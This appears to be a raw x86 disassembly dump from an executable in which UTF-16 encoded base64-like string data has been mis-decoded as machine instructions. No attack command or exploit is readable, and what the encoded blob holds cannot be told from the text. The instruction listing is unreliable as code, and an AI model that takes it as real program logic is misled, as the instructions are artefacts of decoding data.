  40a897:	00 69 00             	add    %ch,0x0(%ecx)
  40a89a:	70 00                	jo     0x40a89c
  40a89c:	74 00                	je     0x40a89e
  40a89e:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40a8a1:	00 49 00             	add    %cl,0x0(%ecx)
  40a8a4:	63 00                	arpl   %eax,(%eax)
  40a8a6:	4e                   	dec    %esi
  40a8a7:	00 67 00             	add    %ah,0x0(%edi)
  40a8aa:	2b 00                	sub    (%eax),%eax
  40a8ac:	61                   	popa
  40a8ad:	00 2f                	add    %ch,(%edi)
  40a8af:	00 41 00             	add    %al,0x0(%ecx)
  40a8b2:	32 00                	xor    (%eax),%al
  40a8b4:	4c                   	dec    %esp
  40a8b5:	00 45 00             	add    %al,0x0(%ebp)
  40a8b8:	77 00                	ja     0x40a8ba
  40a8ba:	4a                   	dec    %edx
  40a8bb:	00 31                	add    %dh,(%ecx)
  40a8bd:	00 69 00             	add    %ch,0x0(%ecx)
  40a8c0:	42                   	inc    %edx
  40a8c1:	00 6e 00             	add    %ch,0x0(%esi)
  40a8c4:	7a 00                	jp     0x40a8c6
  40a8c6:	2b 00                	sub    (%eax),%eax
  40a8c8:	78 00                	js     0x40a8ca
  40a8ca:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8cb:	00 4a 00             	add    %cl,0x0(%edx)
  40a8ce:	68 00 49 00 43       	push   $0x43004900
  40a8d3:	00 50 00             	add    %dl,0x0(%eax)
  40a8d6:	74 00                	je     0x40a8d8
  40a8d8:	68 00 58 00 6f       	push   $0x6f005800
  40a8dd:	00 46 00             	add    %al,0x0(%esi)
  40a8e0:	4a                   	dec    %edx
  40a8e1:	00 77 00             	add    %dh,0x0(%edi)
  40a8e4:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40a8e8:	47                   	inc    %edi
  40a8e9:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40a8ed:	00 6f 00             	add    %ch,0x0(%edi)
  40a8f0:	36 00 30             	add    %dh,%ss:(%eax)
  40a8f3:	00 41 00             	add    %al,0x0(%ecx)
  40a8f6:	63 00                	arpl   %eax,(%eax)
  40a8f8:	57                   	push   %edi
  40a8f9:	00 78 00             	add    %bh,0x0(%eax)
  40a8fc:	53                   	push   %ebx
  40a8fd:	00 51 00             	add    %dl,0x0(%ecx)
  40a900:	4a                   	dec    %edx
  40a901:	00 6a 00             	add    %ch,0x0(%edx)
  40a904:	42                   	inc    %edx
  40a905:	00 5a 00             	add    %bl,0x0(%edx)
  40a908:	4c                   	dec    %esp
  40a909:	00 59 00             	add    %bl,0x0(%ecx)
  40a90c:	4d                   	dec    %ebp
  40a90d:	00 43 00             	add    %al,0x0(%ebx)
  40a910:	38 00                	cmp    %al,(%eax)
  40a912:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40a916:	35 00 46 00 62       	xor    $0x62004600,%eax
  40a91b:	00 78 00             	add    %bh,0x0(%eax)
  40a91e:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40a922:	42                   	inc    %edx
  40a923:	00 79 00             	add    %bh,0x0(%ecx)
  40a926:	72 00                	jb     0x40a928
  40a928:	62 00                	bound  %eax,(%eax)
  40a92a:	4c                   	dec    %esp
  40a92b:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  40a92f:	00 73 00             	add    %dh,0x0(%ebx)
  40a932:	44                   	inc    %esp
  40a933:	00 6e 00             	add    %ch,0x0(%esi)
  40a936:	41                   	inc    %ecx
  40a937:	00 33                	add    %dh,(%ebx)
  40a939:	00 36                	add    %dh,(%esi)
  40a93b:	00 31                	add    %dh,(%ecx)
  40a93d:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40a941:	00 48 00             	add    %cl,0x0(%eax)
  40a944:	33 00                	xor    (%eax),%eax
  40a946:	43                   	inc    %ebx
  40a947:	00 43 00             	add    %al,0x0(%ebx)
  40a94a:	43                   	inc    %ebx
  40a94b:	00 6e 00             	add    %ch,0x0(%esi)
  40a94e:	79 00                	jns    0x40a950
  40a950:	6c                   	insb   (%dx),%es:(%edi)
  40a951:	00 75 00             	add    %dh,0x0(%ebp)
  40a954:	35 00 58 00 33       	xor    $0x33005800,%eax
  40a959:	00 4d 00             	add    %cl,0x0(%ebp)
  40a95c:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40a95f:	00 48 00             	add    %cl,0x0(%eax)
  40a962:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  40a966:	77 00                	ja     0x40a968
  40a968:	4b                   	dec    %ebx
  40a969:	00 32                	add    %dh,(%edx)
  40a96b:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40a96f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a972:	6c                   	insb   (%dx),%es:(%edi)
  40a973:	00 48 00             	add    %cl,0x0(%eax)
  40a976:	66 00 56 00          	data16 add %dl,0x0(%esi)
  40a97a:	45                   	inc    %ebp
  40a97b:	00 52 00             	add    %dl,0x0(%edx)
  40a97e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a97f:	00 77 00             	add    %dh,0x0(%edi)
  40a982:	61                   	popa
  40a983:	00 6d 00             	add    %ch,0x0(%ebp)
  40a986:	54                   	push   %esp
  40a987:	00 30                	add    %dh,(%eax)
  40a989:	00 76 00             	add    %dh,0x0(%esi)
  40a98c:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40a990:	43                   	inc    %ebx
  40a991:	00 6d 00             	add    %ch,0x0(%ebp)
  40a994:	63 00                	arpl   %eax,(%eax)
  40a996:	50                   	push   %eax
  40a997:	00 61 00             	add    %ah,0x0(%ecx)
  40a99a:	70 00                	jo     0x40a99c
  40a99c:	48                   	dec    %eax
  40a99d:	00 51 00             	add    %dl,0x0(%ecx)
  40a9a0:	4f                   	dec    %edi
  40a9a1:	00 4d 00             	add    %cl,0x0(%ebp)
  40a9a4:	62 00                	bound  %eax,(%eax)
  40a9a6:	55                   	push   %ebp
  40a9a7:	00 73 00             	add    %dh,0x0(%ebx)
  40a9aa:	2f                   	das
  40a9ab:	00 72 00             	add    %dh,0x0(%edx)
  40a9ae:	36 00 4c 00 75       	add    %cl,%ss:0x75(%eax,%eax,1)
  40a9b3:	00 6f 00             	add    %ch,0x0(%edi)
  40a9b6:	4d                   	dec    %ebp
  40a9b7:	00 6b 00             	add    %ch,0x0(%ebx)
  40a9ba:	69 00 47 00 55 00    	imul   $0x550047,(%eax),%eax
  40a9c0:	52                   	push   %edx
  40a9c1:	00 6a 00             	add    %ch,0x0(%edx)
  40a9c4:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40a9c8:	38 00                	cmp    %al,(%eax)
  40a9ca:	30 00                	xor    %al,(%eax)
  40a9cc:	30 00                	xor    %al,(%eax)
  40a9ce:	55                   	push   %ebp
  40a9cf:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9d2:	4d                   	dec    %ebp
  40a9d3:	00 51 00             	add    %dl,0x0(%ecx)
  40a9d6:	72 00                	jb     0x40a9d8
  40a9d8:	72 00                	jb     0x40a9da
  40a9da:	55                   	push   %ebp
  40a9db:	00 6f 00             	add    %ch,0x0(%edi)
  40a9de:	73 00                	jae    0x40a9e0
  40a9e0:	39 00                	cmp    %eax,(%eax)
  40a9e2:	42                   	inc    %edx
  40a9e3:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40a9e7:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40a9eb:	00 6a 00             	add    %ch,0x0(%edx)
  40a9ee:	47                   	inc    %edi
  40a9ef:	00 73 00             	add    %dh,0x0(%ebx)
  40a9f2:	55                   	push   %ebp
  40a9f3:	00 32                	add    %dh,(%edx)
  40a9f5:	00 61 00             	add    %ah,0x0(%ecx)
  40a9f8:	69 00 32 00 34 00    	imul   $0x340032,(%eax),%eax
  40a9fe:	57                   	push   %edi
  40a9ff:	00 59 00             	add    %bl,0x0(%ecx)
  40aa02:	4e                   	dec    %esi
  40aa03:	00 61 00             	add    %ah,0x0(%ecx)
  40aa06:	39 00                	cmp    %eax,(%eax)
  40aa08:	2f                   	das
  40aa09:	00 58 00             	add    %bl,0x0(%eax)
  40aa0c:	70 00                	jo     0x40aa0e
  40aa0e:	62 00                	bound  %eax,(%eax)
  40aa10:	73 00                	jae    0x40aa12
  40aa12:	51                   	push   %ecx
  40aa13:	00 6f 00             	add    %ch,0x0(%edi)
  40aa16:	5a                   	pop    %edx
  40aa17:	00 47 00             	add    %al,0x0(%edi)
  40aa1a:	37                   	aaa
  40aa1b:	00 75 00             	add    %dh,0x0(%ebp)
  40aa1e:	69 00 43 00 6c 00    	imul   $0x6c0043,(%eax),%eax
  40aa24:	52                   	push   %edx
  40aa25:	00 61 00             	add    %ah,0x0(%ecx)
  40aa28:	62 00                	bound  %eax,(%eax)
  40aa2a:	4a                   	dec    %edx
  40aa2b:	00 32                	add    %dh,(%edx)
  40aa2d:	00 2f                	add    %ch,(%edi)
  40aa2f:	00 31                	add    %dh,(%ecx)
  40aa31:	00 51 00             	add    %dl,0x0(%ecx)
  40aa34:	45                   	inc    %ebp
  40aa35:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa38:	43                   	inc    %ebx
  40aa39:	00 48 00             	add    %cl,0x0(%eax)
  40aa3c:	6c                   	insb   (%dx),%es:(%edi)
  40aa3d:	00 70 00             	add    %dh,0x0(%eax)
  40aa40:	76 00                	jbe    0x40aa42
  40aa42:	79 00                	jns    0x40aa44
  40aa44:	6c                   	insb   (%dx),%es:(%edi)
  40aa45:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  40aa49:	00 62 00             	add    %ah,0x0(%edx)
  40aa4c:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  40aa50:	30 00                	xor    %al,(%eax)
  40aa52:	41                   	inc    %ecx
  40aa53:	00 45 00             	add    %al,0x0(%ebp)
  40aa56:	32 00                	xor    (%eax),%al
  40aa58:	73 00                	jae    0x40aa5a
  40aa5a:	46                   	inc    %esi
  40aa5b:	00 45 00             	add    %al,0x0(%ebp)
  40aa5e:	6d                   	insl   (%dx),%es:(%edi)
  40aa5f:	00 62 00             	add    %ah,0x0(%edx)
  40aa62:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40aa66:	78 00                	js     0x40aa68
  40aa68:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa69:	00 79 00             	add    %bh,0x0(%ecx)
  40aa6c:	37                   	aaa
  40aa6d:	00 6f 00             	add    %ch,0x0(%edi)
  40aa70:	71 00                	jno    0x40aa72
  40aa72:	6a 00                	push   $0x0
  40aa74:	75 00                	jne    0x40aa76
  40aa76:	34 00                	xor    $0x0,%al
  40aa78:	64 00 35 00 39 00 44 	add    %dh,%fs:0x44003900
  40aa7f:	00 73 00             	add    %dh,0x0(%ebx)
  40aa82:	33 00                	xor    (%eax),%eax
  40aa84:	54                   	push   %esp
  40aa85:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa88:	4a                   	dec    %edx
  40aa89:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa8c:	6c                   	insb   (%dx),%es:(%edi)
  40aa8d:	00 46 00             	add    %al,0x0(%esi)
  40aa90:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40aa94:	75 00                	jne    0x40aa96
  40aa96:	79 00                	jns    0x40aa98
  40aa98:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40aa9c:	72 00                	jb     0x40aa9e
  40aa9e:	54                   	push   %esp
  40aa9f:	00 32                	add    %dh,(%edx)
  40aaa1:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40aaa5:	00 36                	add    %dh,(%esi)
  40aaa7:	00 2f                	add    %ch,(%edi)
  40aaa9:	00 5a 00             	add    %bl,0x0(%edx)
  40aaac:	49                   	dec    %ecx
  40aaad:	00 61 00             	add    %ah,0x0(%ecx)
  40aab0:	45                   	inc    %ebp
  40aab1:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  40aab5:	00 76 00             	add    %dh,0x0(%esi)
  40aab8:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40aabb:	00 50 00             	add    %dl,0x0(%eax)
  40aabe:	30 00                	xor    %al,(%eax)
  40aac0:	45                   	inc    %ebp
  40aac1:	00 30                	add    %dh,(%eax)
  40aac3:	00 48 00             	add    %cl,0x0(%eax)
  40aac6:	4d                   	dec    %ebp
  40aac7:	00 39                	add    %bh,(%ecx)
  40aac9:	00 43 00             	add    %al,0x0(%ebx)
  40aacc:	68 00 7a 00 5a       	push   $0x5a007a00
  40aad1:	00 4b 00             	add    %cl,0x0(%ebx)
  40aad4:	6e                   	outsb  %ds:(%esi),(%dx)
  40aad5:	00 70 00             	add    %dh,0x0(%eax)
  40aad8:	6e                   	outsb  %ds:(%esi),(%dx)
  40aad9:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  40aadd:	00 31                	add    %dh,(%ecx)
  40aadf:	00 59 00             	add    %bl,0x0(%ecx)
  40aae2:	5a                   	pop    %edx
  40aae3:	00 4b 00             	add    %cl,0x0(%ebx)
  40aae6:	47                   	inc    %edi
  40aae7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aaea:	6f                   	outsl  %ds:(%esi),(%dx)
  40aaeb:	00 69 00             	add    %ch,0x0(%ecx)
  40aaee:	73 00                	jae    0x40aaf0
  40aaf0:	49                   	dec    %ecx
  40aaf1:	00 62 00             	add    %ah,0x0(%edx)
  40aaf4:	43                   	inc    %ebx
  40aaf5:	00 43 00             	add    %al,0x0(%ebx)
  40aaf8:	35 00 39 00 6d       	xor    $0x6d003900,%eax
  40aafd:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab00:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40ab04:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  40ab08:	35 00 34 00 33       	xor    $0x33003400,%eax
  40ab0d:	00 69 00             	add    %ch,0x0(%ecx)
  40ab10:	6b 00 59             	imul   $0x59,(%eax),%eax
  40ab13:	00 70 00             	add    %dh,0x0(%eax)
  40ab16:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40ab19:	00 51 00             	add    %dl,0x0(%ecx)
  40ab1c:	65 00 4c 00 58       	add    %cl,%gs:0x58(%eax,%eax,1)
  40ab21:	00 69 00             	add    %ch,0x0(%ecx)
  40ab24:	57                   	push   %edi
  40ab25:	00 33                	add    %dh,(%ebx)
  40ab27:	00 44 00 39          	add    %al,0x39(%eax,%eax,1)
  40ab2b:	00 69 00             	add    %ch,0x0(%ecx)
  40ab2e:	52                   	push   %edx
  40ab2f:	00 6e 00             	add    %ch,0x0(%esi)
  40ab32:	2b 00                	sub    (%eax),%eax
  40ab34:	4c                   	dec    %esp
  40ab35:	00 71 00             	add    %dh,0x0(%ecx)
  40ab38:	73 00                	jae    0x40ab3a
  40ab3a:	30 00                	xor    %al,(%eax)
  40ab3c:	50                   	push   %eax
  40ab3d:	00 76 00             	add    %dh,0x0(%esi)
  40ab40:	49                   	dec    %ecx
  40ab41:	00 45 00             	add    %al,0x0(%ebp)
  40ab44:	37                   	aaa
  40ab45:	00 49 00             	add    %cl,0x0(%ecx)
  40ab48:	4e                   	dec    %esi
  40ab49:	00 48 00             	add    %cl,0x0(%eax)
  40ab4c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab4d:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40ab51:	00 75 00             	add    %dh,0x0(%ebp)
  40ab54:	43                   	inc    %ebx
  40ab55:	00 45 00             	add    %al,0x0(%ebp)
  40ab58:	31 00                	xor    %eax,(%eax)
  40ab5a:	2f                   	das
  40ab5b:	00 43 00             	add    %al,0x0(%ebx)
  40ab5e:	32 00                	xor    (%eax),%al
  40ab60:	44                   	inc    %esp
  40ab61:	00 5a 00             	add    %bl,0x0(%edx)
  40ab64:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40ab68:	76 00                	jbe    0x40ab6a
  40ab6a:	43                   	inc    %ebx
  40ab6b:	00 36                	add    %dh,(%esi)
  40ab6d:	00 5a 00             	add    %bl,0x0(%edx)
  40ab70:	75 00                	jne    0x40ab72
  40ab72:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40ab76:	2b 00                	sub    (%eax),%eax
  40ab78:	34 00                	xor    $0x0,%al
  40ab7a:	5a                   	pop    %edx
  40ab7b:	00 59 00             	add    %bl,0x0(%ecx)
  40ab7e:	36 00 32             	add    %dh,%ss:(%edx)
  40ab81:	00 4f 00             	add    %cl,0x0(%edi)
  40ab84:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40ab88:	6b 00 51             	imul   $0x51,(%eax),%eax
  40ab8b:	00 61 00             	add    %ah,0x0(%ecx)
  40ab8e:	4b                   	dec    %ebx
  40ab8f:	00 69 00             	add    %ch,0x0(%ecx)
  40ab92:	56                   	push   %esi
  40ab93:	00 4b 00             	add    %cl,0x0(%ebx)
  40ab96:	68 00 6c 00 34       	push   $0x34006c00
  40ab9b:	00 43 00             	add    %al,0x0(%ebx)
  40ab9e:	74 00                	je     0x40aba0
  40aba0:	76 00                	jbe    0x40aba2
  40aba2:	34 00                	xor    $0x0,%al
  40aba4:	71 00                	jno    0x40aba6
  40aba6:	37                   	aaa
  40aba7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40abaa:	35 00 79 00 59       	xor    $0x59007900,%eax
  40abaf:	00 6b 00             	add    %ch,0x0(%ebx)
  40abb2:	4d                   	dec    %ebp
  40abb3:	00 42 00             	add    %al,0x0(%edx)
  40abb6:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40abba:	4a                   	dec    %edx
  40abbb:	00 52 00             	add    %dl,0x0(%edx)
  40abbe:	6f                   	outsl  %ds:(%esi),(%dx)
  40abbf:	00 51 00             	add    %dl,0x0(%ecx)
  40abc2:	59                   	pop    %ecx
  40abc3:	00 2f                	add    %ch,(%edi)
  40abc5:	00 67 00             	add    %ah,0x0(%edi)
  40abc8:	39 00                	cmp    %eax,(%eax)
  40abca:	6f                   	outsl  %ds:(%esi),(%dx)
  40abcb:	00 58 00             	add    %bl,0x0(%eax)
  40abce:	33 00                	xor    (%eax),%eax
  40abd0:	2b 00                	sub    (%eax),%eax
  40abd2:	79 00                	jns    0x40abd4
  40abd4:	4c                   	dec    %esp
  40abd5:	00 62 00             	add    %ah,0x0(%edx)
  40abd8:	4a                   	dec    %edx
  40abd9:	00 66 00             	add    %ah,0x0(%esi)
  40abdc:	38 00                	cmp    %al,(%eax)
  40abde:	62 00                	bound  %eax,(%eax)
  40abe0:	58                   	pop    %eax
  40abe1:	00 33                	add    %dh,(%ebx)
  40abe3:	00 39                	add    %bh,(%ecx)
  40abe5:	00 4e 00             	add    %cl,0x0(%esi)
  40abe8:	49                   	dec    %ecx
  40abe9:	00 76 00             	add    %dh,0x0(%esi)
  40abec:	56                   	push   %esi
  40abed:	00 2f                	add    %ch,(%edi)
  40abef:	00 5a 00             	add    %bl,0x0(%edx)
  40abf2:	72 00                	jb     0x40abf4
  40abf4:	71 00                	jno    0x40abf6
  40abf6:	78 00                	js     0x40abf8
  40abf8:	70 00                	jo     0x40abfa
  40abfa:	37                   	aaa
  40abfb:	00 7a 00             	add    %bh,0x0(%edx)
  40abfe:	35 00 70 00 6f       	xor    $0x6f007000,%eax
  40ac03:	00 42 00             	add    %al,0x0(%edx)
  40ac06:	33 00                	xor    (%eax),%eax
  40ac08:	7a 00                	jp     0x40ac0a
  40ac0a:	63 00                	arpl   %eax,(%eax)
  40ac0c:	57                   	push   %edi
  40ac0d:	00 72 00             	add    %dh,0x0(%edx)
  40ac10:	49                   	dec    %ecx
  40ac11:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  40ac15:	00 48 00             	add    %cl,0x0(%eax)
  40ac18:	55                   	push   %ebp
  40ac19:	00 37                	add    %dh,(%edi)
  40ac1b:	00 79 00             	add    %bh,0x0(%ecx)
  40ac1e:	41                   	inc    %ecx
  40ac1f:	00 58 00             	add    %bl,0x0(%eax)
  40ac22:	44                   	inc    %esp
  40ac23:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40ac27:	00 43 00             	add    %al,0x0(%ebx)
  40ac2a:	57                   	push   %edi
  40ac2b:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40ac2f:	00 39                	add    %bh,(%ecx)
  40ac31:	00 52 00             	add    %dl,0x0(%edx)
  40ac34:	50                   	push   %eax
  40ac35:	00 2b                	add    %ch,(%ebx)
  40ac37:	00 4f 00             	add    %cl,0x0(%edi)
  40ac3a:	44                   	inc    %esp
  40ac3b:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40ac3f:	00 58 00             	add    %bl,0x0(%eax)
  40ac42:	69 00 76 00 36 00    	imul   $0x360076,(%eax),%eax
  40ac48:	71 00                	jno    0x40ac4a
  40ac4a:	79 00                	jns    0x40ac4c
  40ac4c:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40ac4f:	00 48 00             	add    %cl,0x0(%eax)
  40ac52:	6b 00 57             	imul   $0x57,(%eax),%eax
  40ac55:	00 63 00             	add    %ah,0x0(%ebx)
  40ac58:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40ac5c:	78 00                	js     0x40ac5e
  40ac5e:	2b 00                	sub    (%eax),%eax
  40ac60:	52                   	push   %edx
  40ac61:	00 77 00             	add    %dh,0x0(%edi)
  40ac64:	73 00                	jae    0x40ac66
  40ac66:	67 00 2b             	add    %ch,(%bp,%di)
  40ac69:	00 2b                	add    %ch,(%ebx)
  40ac6b:	00 72 00             	add    %dh,0x0(%edx)
  40ac6e:	56                   	push   %esi
  40ac6f:	00 36                	add    %dh,(%esi)
  40ac71:	00 47 00             	add    %al,0x0(%edi)
  40ac74:	45                   	inc    %ebp
  40ac75:	00 63 00             	add    %ah,0x0(%ebx)
  40ac78:	54                   	push   %esp
  40ac79:	00 62 00             	add    %ah,0x0(%edx)
  40ac7c:	69 00 6b 00 4f 00    	imul   $0x4f006b,(%eax),%eax
  40ac82:	44                   	inc    %esp
  40ac83:	00 35 00 4a 00 39    	add    %dh,0x39004a00
  40ac89:	00 63 00             	add    %ah,0x0(%ebx)
  40ac8c:	58                   	pop    %eax
  40ac8d:	00 31                	add    %dh,(%ecx)
  40ac8f:	00 68 00             	add    %ch,0x0(%eax)
  40ac92:	4e                   	dec    %esi
  40ac93:	00 7a 00             	add    %bh,0x0(%edx)
  40ac96:	47                   	inc    %edi
  40ac97:	00 33                	add    %dh,(%ebx)
  40ac99:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40ac9d:	00 66 00             	add    %ah,0x0(%esi)
  40aca0:	35 00 77 00 6c       	xor    $0x6c007700,%eax
  40aca5:	00 63 00             	add    %ah,0x0(%ebx)
  40aca8:	30 00                	xor    %al,(%eax)
  40acaa:	58                   	pop    %eax
  40acab:	00 65 00             	add    %ah,0x0(%ebp)
  40acae:	33 00                	xor    (%eax),%eax
  40acb0:	34 00                	xor    $0x0,%al
  40acb2:	41                   	inc    %ecx
  40acb3:	00 78 00             	add    %bh,0x0(%eax)
  40acb6:	62 00                	bound  %eax,(%eax)
  40acb8:	59                   	pop    %ecx
  40acb9:	00 57 00             	add    %dl,0x0(%edi)
  40acbc:	51                   	push   %ecx
  40acbd:	00 41 00             	add    %al,0x0(%ecx)
  40acc0:	53                   	push   %ebx
  40acc1:	00 46 00             	add    %al,0x0(%esi)
  40acc4:	46                   	inc    %esi
  40acc5:	00 4d 00             	add    %cl,0x0(%ebp)
  40acc8:	4d                   	dec    %ebp
  40acc9:	00 76 00             	add    %dh,0x0(%esi)
  40accc:	63 00                	arpl   %eax,(%eax)
  40acce:	4f                   	dec    %edi
  40accf:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  40acd3:	00 67 00             	add    %ah,0x0(%edi)
  40acd6:	51                   	push   %ecx
  40acd7:	00 70 00             	add    %dh,0x0(%eax)
  40acda:	33 00                	xor    (%eax),%eax
  40acdc:	6b 00 50             	imul   $0x50,(%eax),%eax
  40acdf:	00 65 00             	add    %ah,0x0(%ebp)
  40ace2:	51                   	push   %ecx
  40ace3:	00 6a 00             	add    %ch,0x0(%edx)
  40ace6:	70 00                	jo     0x40ace8
  40ace8:	56                   	push   %esi
  40ace9:	00 38                	add    %bh,(%eax)
  40aceb:	00 47 00             	add    %al,0x0(%edi)
  40acee:	6b 00 64             	imul   $0x64,(%eax),%eax
  40acf1:	00 52 00             	add    %dl,0x0(%edx)
  40acf4:	6c                   	insb   (%dx),%es:(%edi)
  40acf5:	00 48 00             	add    %cl,0x0(%eax)
  40acf8:	39 00                	cmp    %eax,(%eax)
  40acfa:	79 00                	jns    0x40acfc
  40acfc:	74 00                	je     0x40acfe
  40acfe:	4f                   	dec    %edi
  40acff:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad02:	70 00                	jo     0x40ad04
  40ad04:	68 00 39 00 67       	push   $0x67003900
  40ad09:	00 51 00             	add    %dl,0x0(%ecx)
  40ad0c:	4e                   	dec    %esi
  40ad0d:	00 4e 00             	add    %cl,0x0(%esi)
  40ad10:	73 00                	jae    0x40ad12
  40ad12:	33 00                	xor    (%eax),%eax
  40ad14:	6c                   	insb   (%dx),%es:(%edi)
  40ad15:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40ad19:	00 38                	add    %bh,(%eax)
  40ad1b:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40ad1f:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40ad23:	00 52 00             	add    %dl,0x0(%edx)
  40ad26:	5a                   	pop    %edx
  40ad27:	00 66 00             	add    %ah,0x0(%esi)
  40ad2a:	7a 00                	jp     0x40ad2c
  40ad2c:	42                   	inc    %edx
  40ad2d:	00 41 00             	add    %al,0x0(%ecx)
  40ad30:	2f                   	das
  40ad31:	00 49 00             	add    %cl,0x0(%ecx)
  40ad34:	73 00                	jae    0x40ad36
  40ad36:	79 00                	jns    0x40ad38
  40ad38:	46                   	inc    %esi
  40ad39:	00 4a 00             	add    %cl,0x0(%edx)
  40ad3c:	4a                   	dec    %edx
  40ad3d:	00 52 00             	add    %dl,0x0(%edx)
  40ad40:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40ad44:	5a                   	pop    %edx
  40ad45:	00 6a 00             	add    %ch,0x0(%edx)
  40ad48:	2b 00                	sub    (%eax),%eax
  40ad4a:	58                   	pop    %eax
  40ad4b:	00 50 00             	add    %dl,0x0(%eax)
  40ad4e:	65 00 4c 00 65       	add    %cl,%gs:0x65(%eax,%eax,1)
  40ad53:	00 6a 00             	add    %ch,0x0(%edx)
  40ad56:	52                   	push   %edx
  40ad57:	00 70 00             	add    %dh,0x0(%eax)
  40ad5a:	42                   	inc    %edx
  40ad5b:	00 76 00             	add    %dh,0x0(%esi)
  40ad5e:	54                   	push   %esp
  40ad5f:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad62:	57                   	push   %edi
  40ad63:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40ad67:	00 50 00             	add    %dl,0x0(%eax)
  40ad6a:	75 00                	jne    0x40ad6c
  40ad6c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad6d:	00 6a 00             	add    %ch,0x0(%edx)
  40ad70:	6d                   	insl   (%dx),%es:(%edi)
  40ad71:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  40ad75:	00 4f 00             	add    %cl,0x0(%edi)
  40ad78:	31 00                	xor    %eax,(%eax)
  40ad7a:	4a                   	dec    %edx
  40ad7b:	00 68 00             	add    %ch,0x0(%eax)
  40ad7e:	68 00 63 00 6c       	push   $0x6c006300
  40ad83:	00 31                	add    %dh,(%ecx)
  40ad85:	00 52 00             	add    %dl,0x0(%edx)
  40ad88:	51                   	push   %ecx
  40ad89:	00 65 00             	add    %ah,0x0(%ebp)
  40ad8c:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40ad90:	42                   	inc    %edx
  40ad91:	00 39                	add    %bh,(%ecx)
  40ad93:	00 33                	add    %dh,(%ebx)
  40ad95:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad98:	46                   	inc    %esi
  40ad99:	00 33                	add    %dh,(%ebx)
  40ad9b:	00 6f 00             	add    %ch,0x0(%edi)
  40ad9e:	71 00                	jno    0x40ada0
  40ada0:	61                   	popa
  40ada1:	00 68 00             	add    %ch,0x0(%eax)
  40ada4:	36 00 38             	add    %bh,%ss:(%eax)
  40ada7:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40adab:	00 66 00             	add    %ah,0x0(%esi)
  40adae:	56                   	push   %esi
  40adaf:	00 51 00             	add    %dl,0x0(%ecx)
  40adb2:	6a 00                	push   $0x0
  40adb4:	4f                   	dec    %edi
  40adb5:	00 38                	add    %bh,(%eax)
  40adb7:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40adbb:	00 4d 00             	add    %cl,0x0(%ebp)
  40adbe:	79 00                	jns    0x40adc0
  40adc0:	4d                   	dec    %ebp
  40adc1:	00 59 00             	add    %bl,0x0(%ecx)
  40adc4:	57                   	push   %edi
  40adc5:	00 49 00             	add    %cl,0x0(%ecx)
  40adc8:	6f                   	outsl  %ds:(%esi),(%dx)
  40adc9:	00 55 00             	add    %dl,0x0(%ebp)
  40adcc:	34 00                	xor    $0x0,%al
  40adce:	55                   	push   %ebp
  40adcf:	00 48 00             	add    %cl,0x0(%eax)
  40add2:	39 00                	cmp    %eax,(%eax)
  40add4:	4f                   	dec    %edi
  40add5:	00 49 00             	add    %cl,0x0(%ecx)
  40add8:	6e                   	outsb  %ds:(%esi),(%dx)
